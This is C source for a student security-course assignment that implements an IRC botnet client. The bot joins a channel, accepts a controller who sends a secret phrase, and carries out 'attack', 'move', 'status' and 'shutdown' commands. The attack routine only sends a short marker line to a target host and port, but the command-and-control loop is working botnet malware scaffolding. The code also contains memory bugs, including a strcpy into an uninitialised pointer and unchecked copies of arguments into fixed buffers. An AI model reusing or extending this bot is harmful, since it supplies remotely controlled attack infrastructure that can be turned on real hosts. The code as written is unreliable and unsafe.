
/*
 * CPSC 526 Assignment 6
 * Geordie Tait
 * 10013837
 * T02
 *
 * IRC Botnet
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <getopt.h>
#include <time.h>

#define BUFSIZE 1024    // buffer size
#define ID_LEN 2        // length of alphanumeric identifier in nick
#define CONN_TIMEOUT 5  // connection timeout

// global variables
struct {
    char channel[128];     
    char nick[128];        
    int attacks;
    char buffer[BUFSIZE];  // temporary buffer for input
    char outbuf[BUFSIZE];  // buffer for output
} globals;

// report error message & exit
void die( const char * errorMessage, ...) {
    fprintf( stderr, "\nError: ");
    va_list args;
    va_start( args, errorMessage);
    vfprintf( stderr, errorMessage, args);
    fprintf( stderr, "\n");
    va_end( args);
    exit(-1);
}

// read a line of text from file descriptor into provided buffer, up to provided char limit
int readLineFromFd( int fd, char * buff, int max) {
    char * ptr = buff;
    int count = 0;
    int result = 1;
    
    while (1) {

        // try to read in the next character from fd, exit loop on failure
        int n = read(fd, ptr, 1);
        if (n < 1) {
            result = n;
            break;
        }

        // character stored, now advance ptr and character count
        ptr ++;
        count++;

        // if last character read was a newline, exit loop
        if (*(ptr - 1) == '\n') break;

        // if the buffer capacity is reached, exit loop
        if (count >= max - 1) break;        
    }
    
    // rewind ptr to the last read character
    ptr --;

    // trim trailing spaces (including new lines, telnet's \r's)
    while (ptr > buff && isspace(*ptr)) {
        ptr--;
    }

    // terminate the string
    * (ptr + 1) = '\0';
    
    return result;
}

// check beginning of a string
int beginsWith(char *str, char *prefix) {

    int i;
    for (i = 0; i < strlen(prefix); i++) {
        if (prefix[i] != str[i])
            return 0;
    }
    return 1;
}

// generate a string of random alphanumeric characters
void getRandomStr(char *out, size_t n) {
    char chars[] = "0123456789"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    srand(time(NULL));
    while (n-- > 0) {
        size_t index = (double) rand() / RAND_MAX * (sizeof(chars) - 1);
        *out++ = chars[index];
    }
    *out = 0;
}

// send a message to a given target on the IRC server
int ircMessage(int ircSockFd, char *target, char *msg) {

    char output[BUFSIZE];
    sprintf(output, "PRIVMSG %s :%s\r\n", target, msg);
    if (write(ircSockFd, output, strlen(output)) < 1)
        return 0;

    return 1;
}

// connect to an IRC server
int ircConnect(char *host, int port, char *channel) {

    int ircSockFd;
    struct sockaddr_in destaddr;
    struct hostent *server;
    char chan[32];
    strcpy(chan, channel);

    // open socket for connecting to IRC server
    ircSockFd = socket(AF_INET, SOCK_STREAM, 0);
    if (ircSockFd < 0)
        return -1;

    // get IRC server host
    server = gethostbyname(host);
    if (server == NULL)
        return -1;

    // connect to IRC server
    bzero((char *)&destaddr, sizeof(destaddr));
    destaddr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&destaddr.sin_addr.s_addr, server->h_length);
    destaddr.sin_port = htons(port);
    if (connect(ircSockFd, (struct sockaddr *)&destaddr, sizeof(destaddr)) < 0)
        return -1;

    // loop until we have an unused nick
    while (1) {

        // generate a nick
        char nickrand[ID_LEN+1]; 
        getRandomStr(nickrand, ID_LEN);
        sprintf(globals.nick, "bot%s", nickrand);

        // send NICK message
        bzero(globals.buffer, BUFSIZE);
        sprintf(globals.buffer, "NICK %s\r\n", globals.nick);
        if (write(ircSockFd, globals.buffer, strlen(globals.buffer)) < 1)
            return -1;

        // send USER message
        bzero(globals.buffer, BUFSIZE);
        sprintf(globals.buffer, "USER %s * * :Bot %s\r\n", globals.nick, nickrand);
        if (write(ircSockFd, globals.buffer, strlen(globals.buffer)) < 1)
            return -1;

        // receive response
        bzero(globals.buffer, BUFSIZE);
        int n = read(ircSockFd, globals.buffer, BUFSIZE);
        if (n < 1) return -1;

        // check response
        char *host, *code;
        host = strtok(globals.buffer, " ");
        code = strtok(NULL, " ");
        if (code == NULL) return -1;

        if (beginsWith(code, "001"))
            break;
        sleep(1);
    }

    // join channel
    bzero(globals.channel, sizeof(globals.channel));
    sprintf(globals.channel, "#%s", chan);
    bzero(globals.buffer, BUFSIZE);
    sprintf(globals.buffer, "JOIN %s\r\n", globals.channel);
    if (write(ircSockFd, globals.buffer, strlen(globals.buffer)) < 1)
        return -1;

    // receive response
    bzero(globals.buffer, BUFSIZE);
    int n = read(ircSockFd, globals.buffer, BUFSIZE);
    if (n < 1) return -1;

    // check response
    return ircSockFd;
}

// process communication with the controller
int processCommands(int ircSockFd, char *secret) {

    char user[128];

    // wait for secret phrase to authorize controller
    int auth = 0;
    while (!auth) {

        // receive lines from IRC server
        int n;
        do {
            n = readLineFromFd(ircSockFd, globals.buffer, BUFSIZE);
            if (n < 1) return 0;

            // parse lines
            if (n > 0) {
                char *userstr, *cmd, *rest1, *rest2;
                userstr = strtok(globals.buffer, " ");
                cmd = strtok(NULL, " ");
                rest1 = strtok(NULL, " ");
                rest2 = strtok(NULL, "\r\n");

                // skip invalid lines
                if (userstr == NULL 
                        || cmd == NULL 
                        || rest1 == NULL
                        || rest2 == NULL)
                    continue;
                
                // skip if not PRIVMSG
                if (strcmp(cmd, "PRIVMSG") != 0)
                    continue;

                // check if message matches secret
                *(rest2)++;
                if (strcmp(rest2, secret) == 0) {
                    auth = 1;
                    strcpy(user, userstr);
                    break;
                }
            }

        } while (n > 0);
    }

    // listen for commands from the authorized user
    while (1) {

        // receive lines
        int n;
        do {
            n = readLineFromFd(ircSockFd, globals.buffer, BUFSIZE);
            if (n < 1) return 0;

            // parse lines
            if (n > 0) {
                char *userstr, *cmd, *rest1, *rest2;
                userstr = strtok(globals.buffer, " ");
                cmd = strtok(NULL, " ");
                rest1 = strtok(NULL, " ");
                rest2 = strtok(NULL, "\r\n");

                // skip invalid lines
                if (userstr == NULL 
                        || cmd == NULL 
                        || rest1 == NULL)
                    continue;

                // skip if not authorized user
                if (strcmp(user, userstr) != 0)
                    continue;

                // reset if controller disconnected
                if (beginsWith(cmd, "QUIT"))
                    return 0;
                
                // skip if not PRIVMSG
                if (strcmp(cmd, "PRIVMSG") != 0
                        || rest2 == NULL)
                    continue;

                // parse authorized username
                char *username;
                strcpy(username, user);
                username = strtok(username, "!");
                *(username)++;

                // check if message matches a command
                *(rest2)++;

                // status command
                if (beginsWith(rest2, "HEY BRO") 
                        || beginsWith(rest2, "status")) {

                    // send private message to authorized user
                    if (ircMessage(ircSockFd, username, "SUH DUDE?") == 0)
                        return 0;
                }

                // attack command
                else if (beginsWith(rest2, "DO")
                        || beginsWith(rest2, "attack")) {

                    // parse attack command
                    char *cmd, *host, *portstr, *end;
                    cmd = strtok(rest2, " ");
                    host = strtok(NULL, " ");
                    portstr = strtok(NULL, " ");

                    // skip if invalid
                    if (cmd == NULL || host == NULL
                            || portstr == NULL)
                        continue;

                    for (int i = 0; i < strlen(portstr); i++) {
                        if (portstr[i] == '\r') portstr[i] = 0;
                    }
                    int port = strtol(portstr, &end, 10);
                    if (*end != 0) continue;

                    // perform the attack
                    char msg[128];
                    int attackSockFd;
                    struct sockaddr_in destaddr;
                    struct hostent *server;
                    int success = 1;

                    // open socket for connecting to victim
                    attackSockFd = socket(AF_INET, SOCK_STREAM, 0);
                    if (attackSockFd < 0)
                        success = 0;

                    // get victim host
                    if (success) {
                        server = gethostbyname(host);
                        if (server == NULL)
                            success = 0;
                    }

                    // connect to victim
                    if (success) {
                        bzero((char *)&destaddr, sizeof(destaddr));
                        destaddr.sin_family = AF_INET;
                        bcopy((char *)server->h_addr, (char *)&destaddr.sin_addr.s_addr, server->h_length);
                        destaddr.sin_port = htons(port);
                        if (connect(attackSockFd, (struct sockaddr *)&destaddr, sizeof(destaddr)) < 0)
                            success = 0;
                    }

                    // send data to victim
                    if (success) {
                        char attackmsg[128];
                        sprintf(attackmsg, "%d,%s\n", globals.attacks, globals.nick);
                        if (write(attackSockFd, attackmsg, strlen(attackmsg)) < 1)
                            success = 0;
                        globals.attacks++;
                        close(attackSockFd);
                    }

                    // inform controller of result
                    if (success)
                        sprintf(msg, "ATTACK SUCCESSFUL");
                    else
                        sprintf(msg, "ATTACK FAILED");

                    // send private message to authorized user
                    if (ircMessage(ircSockFd, username, msg) == 0)
                        return 0;
                }

                // move command
                else if (beginsWith(rest2, "BOOGIE")
                        || beginsWith(rest2, "move")) {

                    // parse move command
                    char *cmd, *host, *portstr, *chan, *end;
                    cmd = strtok(rest2, " ");
                    host = strtok(NULL, " ");
                    portstr = strtok(NULL, " ");
                    chan = strtok(NULL, " ");

                    // skip if invalid
                    if (cmd == NULL || host == NULL
                            || portstr == NULL || chan == NULL)
                        continue;

                    int port = strtol(portstr, &end, 10);
                    if (*end != 0) continue;

                    for (int i = 0; i < strlen(chan); i++) {
                        if (chan[i] == '\r') chan[i] = 0;
                    }

                    // send private message to authorized user
                    if (ircMessage(ircSockFd, username, "MOVED") == 0)
                        return 0;

                    // disconnect and connect to new IRC server
                    close(ircSockFd);
                    ircSockFd = ircConnect(host, port, chan);
                    if (ircSockFd == -1)
                        return 0;
                }

                // shutdown command
                else if (beginsWith(rest2, "PEACE OUT")
                        || beginsWith(rest2, "shutdown")) {

                    // send private message to authorized user and quit
                    if (ircMessage(ircSockFd, username, "CATCH YOU ON THE FLIPSIDE") == 0)
                        return 0;
                    return 1;
                }
            }

        } while (n > 0);
    }
    
    return 1;
}

// handle connection to server
int processConn(char *host, int port, char *channel, char *secret) {

    // connect to IRC server
    int ircSockFd = ircConnect(host, port, channel);
    if (ircSockFd == -1) return 0;
    
    // begin command processing loop
    if (processCommands(ircSockFd, secret) == 0) {
        close(ircSockFd);
        return 0;
    }

    // clean up and exit
    close(ircSockFd);
    return 1;
}

// print usage
void usage() {
    die( "Usage: ./conbot hostname port channel secret_phrase\n");
}

// main program function (entry point)
int main( int argc, char ** argv) {
    char hostname[32], portstr[8], channel[64], secret[128];
    int port;
    globals.attacks = 0;

    // parse command line arguments
    if (argc != 5) usage();
    strcpy(hostname, argv[1]);
    strcpy(portstr, argv[2]);
    strcpy(channel, argv[3]);
    strcpy(secret, argv[4]);
    char *end = NULL;
    port = strtol(portstr, &end, 10);

    // check for invalid arguments
    if (*end != 0)
        die("Invalid port: %s", portstr);

    // handle the connection
    while (1) {
        // connect, reconnecting after timeout if connection lost
        if (processConn(hostname, port, channel, secret) == 0) {
            sleep(CONN_TIMEOUT);
        }
        else break;
    }

    // clean up and exit
    return 0;
}


